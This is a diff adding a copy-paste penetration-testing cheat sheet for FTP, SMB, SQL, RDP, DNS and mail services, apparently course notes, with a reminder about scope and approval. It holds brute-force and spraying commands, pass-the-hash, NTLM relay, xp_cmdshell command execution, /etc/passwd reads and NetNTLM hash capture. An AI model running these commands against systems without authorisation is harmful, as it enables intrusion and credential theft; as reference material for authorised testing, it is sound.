@@ -121,3 +121,57 @@ searchsploit <product> <version>
 searchsploit -x path/to/exploit               # view exploit
 # also: Exploit-DB, CVE Details per service, Google the exact banner
 ```
+
+---
+# Attacking Common Services — quick commands
+Flat copy-paste reference (explanations in `11-attacking-common-services/README.md`). Intrusive — scope + approval.
+
+## FTP (21)
+```bash
+ftp <ip> ; nc -v <ip> 21
+hydra -l <user> -P rockyou.txt ftp://<ip>
+```
+
+## SMB (445)
+```bash
+smbclient -N -L //<ip>                         # null session
+smbmap -H <ip> [-r <share>] [--download "x\y"] [--upload f "x\f"]
+smbmap -H <ip> -u <u> -p <p> -d <DOMAIN>
+rpcclient -U'%' <ip> ; enum4linux-ng.py <ip> -A -C
+crackmapexec smb <ip> -u users.txt -p 'Pass!'  # spray
+crackmapexec smb <ip> -u <u> -p <p> -x 'whoami' --exec-method smbexec
+crackmapexec smb <ip> -u <u> -p <p> --sam --loggedon-users
+crackmapexec smb <ip> -u Administrator -H <hash>   # PtH
+impacket-psexec administrator:'Pass!'@<ip>
+impacket-ntlmrelayx --no-http-server -smb2support -t <ip>     # relay → SAM dump
+```
+
+## SQL (MySQL 3306 / MSSQL 1433)
+```bash
+mysql -u <u> -p<p> -h <ip>
+sqsh -S <ip> -U <u> -P '<p>'                   # MSSQL from Linux (.\\<u> for Windows auth)
+mssqlclient.py <DOMAIN>/<u>@<ip> -windows-auth
+# MSSQL RCE:  EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
+#             EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;  →  xp_cmdshell 'whoami'
+# read files:  MSSQL OPENROWSET(BULK ...) ; MySQL LOAD_FILE('/etc/passwd')
+# MySQL file write (webshell) → INTO OUTFILE (payload not stored here); check secure_file_priv first
+# steal NetNTLM: EXEC master..xp_dirtree '\\<ME>\share\'  (catch with responder -I tun0, crack -m 5600)
+# linked servers: SELECT srvname,isremote FROM sysservers ; EXECUTE('<q>') AT [<linked>]
+```
+
+## RDP (3389)
+```bash
+crowbar -b rdp -s <ip>/32 -U users.txt -c 'Pass!'   # spray
+hydra -L users.txt -p 'Pass!' <ip> rdp
+xfreerdp /v:<ip> /u:<u> /p:'<p>'   (or /pth:<NThash>)
+# session hijack (SYSTEM): tscon <id> /dest:<our_session>
+```
+
+## DNS (53) / Email (25/110/993...)
+```bash
+dig AXFR @<ns> <domain>                        # zone transfer
+subfinder -d <domain> -v
+host -t MX <domain> ; smtp-user-enum -M RCPT -U users.txt -D <domain> -t <ip>
+swaks --from a@x --to b@y --server <ip>         # open relay test
+o365spray.py --enum/--spray -U users.txt --domain <d>   # cloud mail
+```
